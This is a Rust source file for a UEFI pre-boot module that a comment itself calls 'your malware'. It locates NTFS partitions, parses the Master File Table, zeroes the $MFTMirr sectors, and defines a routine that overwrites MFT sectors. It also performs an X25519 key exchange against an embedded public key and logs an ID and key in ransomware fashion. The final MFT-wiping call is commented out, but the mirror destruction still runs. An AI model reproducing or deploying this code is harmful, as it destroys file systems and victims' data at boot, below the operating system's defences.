use alloc::vec;
use alloc::vec::Vec;
use core::ops::Range;
use core::str;
use rand::rngs::OsRng;

use uefi::prelude::SystemTable;
use uefi::proto::media::block::BlockIO;
use uefi::table::Boot;
use uefi::ResultExt;
use x25519_dalek::{EphemeralSecret, PublicKey};

const OEM_ID: &[u8; 8] = b"NTFS    ";

fn read_mft_entry(
    blk: &BlockIO,
    media_id: u32,
    entry_nb: u64,
    buf: &mut [u8],
    entry_buf: &mut [u8],
) -> Result<(), ()> {
    // Read the first half of the file record
    blk.read_blocks(media_id, entry_nb, buf).unwrap_success();

    // If it doesn't start the file FILE signature then get out
    if &buf[0..4] != b"FILE" {
        return Err(());
    }
    // Then put in the entry buffer
    entry_buf[..512].copy_from_slice(&buf[..512]);

    // Read the other half
    blk.read_blocks(media_id, entry_nb + 1, buf)
        .unwrap_success();
    entry_buf[512..(512 + 512)].copy_from_slice(&buf[..512]);

    // We're good
    Ok(())
}

fn get_mft_ranges(
    blk: &mut BlockIO,
    media_id: u32,
    boot_sector: u64,
    buf: &mut [u8],
) -> Result<Vec<Range<u64>>, ()> {
    // Read Boot Sector, which is the first sector of NTFS partition
    blk.read_blocks(media_id, boot_sector, buf).unwrap_success();

    // Get start sector of $MFT and $MFTMirr from Boot Sector
    let mft_start = u64::from_ne_bytes(buf[48..56].try_into().unwrap());
    let mft_start = (mft_start * 8) + boot_sector;
    let mft_mir_start = u64::from_ne_bytes(buf[56..64].try_into().unwrap());
    let mft_mir_start = (mft_mir_start * 8) + boot_sector;

    // Destroy the $MFTMirr cluster, do it here cause it's only 8 sectors to overwrite
    let buf2 = [0u8; 512];
    for sector in mft_mir_start..mft_mir_start + 8 {
        blk.write_blocks(media_id, sector, &buf2).unwrap_success();
    }

    // Prepare a buffer with the size of a file record entry
    let mut mft_entry_buf = [0u8; 1024];

    // Read the $MFT file record entry, which is the first entry of the MFT zone
    read_mft_entry(blk, media_id, mft_start, buf, &mut mft_entry_buf)?;

    // Get the first attribute offset from of file record entry header
    let mut first_attribute_offset =
        u16::from_ne_bytes(mft_entry_buf[20..22].try_into().unwrap()) as usize;

    // Iterate over attributes header until finding the $DATA attribute (0x80) or end (0xFF)
    let mut data_run_offset = 0;
    loop {
        if mft_entry_buf[first_attribute_offset] == 0x80 {
            data_run_offset = u16::from_ne_bytes(
                mft_entry_buf[first_attribute_offset + 32..first_attribute_offset + 34]
                    .try_into()
                    .unwrap(),
            ) as usize;
            data_run_offset += first_attribute_offset;
            break;
        } else if mft_entry_buf[first_attribute_offset] == 0xFF {
            break;
        } else {
            let length = u32::from_ne_bytes(
                mft_entry_buf[first_attribute_offset + 4..first_attribute_offset + 8]
                    .try_into()
                    .unwrap(),
            ) as usize;

            first_attribute_offset += length
        }
    }

    // If it doesn't find the $DATA (which would be odd) get out
    if data_run_offset == 0 {
        return Err(());
    };

    let mut ranges: Vec<Range<u64>> = vec![];

    loop {
        match mft_entry_buf[data_run_offset] {
            0x31 => {
                let data_run_size = (mft_entry_buf[data_run_offset + 1] * 8) as u64;
                let mut data_run_first =
                    mft_entry_buf[data_run_offset + 2..data_run_offset + 5].to_vec();
                data_run_first.push(0);
                let data_run_first =
                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;

                ranges.push(data_run_first..data_run_first + data_run_size);
                data_run_offset += 5;
            }

            0x32 => {
                let data_run_size = (u16::from_ne_bytes(
                    mft_entry_buf[data_run_offset + 1..data_run_offset + 3]
                        .try_into()
                        .unwrap(),
                ) * 8) as u64;

                let mut data_run_first =
                    mft_entry_buf[data_run_offset + 3..data_run_offset + 6].to_vec();
                data_run_first.push(0);
                let data_run_first =
                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;

                ranges.push(data_run_first..data_run_first + data_run_size);
                data_run_offset += 6;
            }

            0x33 => {
                let mut data_run_size =
                    mft_entry_buf[data_run_offset + 1..data_run_offset + 4].to_vec();
                data_run_size.push(0);
                let data_run_size =
                    (u16::from_ne_bytes(data_run_size.try_into().unwrap()) * 8) as u64;
                let mut data_run_first =
                    mft_entry_buf[data_run_offset + 4..data_run_offset + 7].to_vec();
                data_run_first.push(0);
                let data_run_first =
                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;
                ranges.push(data_run_first..data_run_first + data_run_size);
                data_run_offset += 7;
            }

            0x42 => {
                let data_run_size = (u16::from_ne_bytes(
                    mft_entry_buf[data_run_offset + 1..data_run_offset + 3]
                        .try_into()
                        .unwrap(),
                ) * 8) as u64;
                let data_run_first = (u32::from_ne_bytes(
                    mft_entry_buf[data_run_offset + 3..data_run_offset + 7]
                        .try_into()
                        .unwrap(),
                ) * 8) as u64;
                ranges.push(data_run_first..data_run_first + data_run_size);
                data_run_offset += 7;
            }

            _ => break,
        }
    }

    Ok(ranges)
}

/// Fire !
fn beat_the_shit_out_of_the_mft(blk: &mut BlockIO, media_id: u32, mft_runs: Vec<Range<u64>>) {
    let buf = [0u8; 512];

    log::info!("Start destroying..."); // DEBUG

    for run in mft_runs {
        for sector in run {
            if sector % 2 == 0 {
                blk.write_blocks(media_id, sector, &buf).unwrap_success();
            }
        }
    }

    log::info!("Finished !"); // DEBUG
}

pub fn destroy(st: &SystemTable<Boot>) {
    // Get list of handles which instantiate a BlockIO
    let handles = st
        .boot_services()
        .find_handles::<BlockIO>()
        .expect_success("failed to find handles for `BlockIO`"); // TODO: You might not want your malware to panic bro

    for handle in handles {
        let blk = st
            .boot_services()
            .handle_protocol::<BlockIO>(handle)
            .expect_success("Failed to get BlockIO protocol"); // TODO: Same

        let blk = unsafe { &mut *blk.get() };
        let blk_media = blk.media();
        let media_id = blk_media.media_id();
        let _block_size = blk_media.block_size();
        let _low_lba = blk_media.lowest_aligned_lba();

        let mut buf = [0u8; 512];
        blk.read_blocks(media_id, 0, &mut buf).unwrap_success();

        // If not a NTFS partition then get out
        if &buf[3..11] != OEM_ID {
            continue;
        }

        if let Ok(ranges) = get_mft_ranges(blk, media_id, 0, &mut buf) {
            let public_key_hex = include_str!("include/public_key.hex");
            let mut buf = [0u8; 32];
            hex::decode_to_slice(public_key_hex, &mut buf).expect("Public key hex to bytes");
            let public_key = PublicKey::from(buf);

            let rng = OsRng;
            let secret = EphemeralSecret::new(rng);
            let id = PublicKey::from(&secret);
            let key = secret.diffie_hellman(&public_key);

            let mut buf = [0u8; 64];
            hex::encode_to_slice(id.as_bytes(), &mut buf).expect("id to hex");
            log::info!("ID :{}", str::from_utf8(&buf).unwrap());

            hex::encode_to_slice(key.as_bytes(), &mut buf).expect("id to hex");
            log::info!("KEY :{}", str::from_utf8(&buf).unwrap());

            // TODO: Write id to ESP root

            loop {}
            //beat_the_shit_out_of_the_mft(blk, media_id, ranges);
            //log::info!("{:#?}", ranges); // DEBUG
        }
    }
}
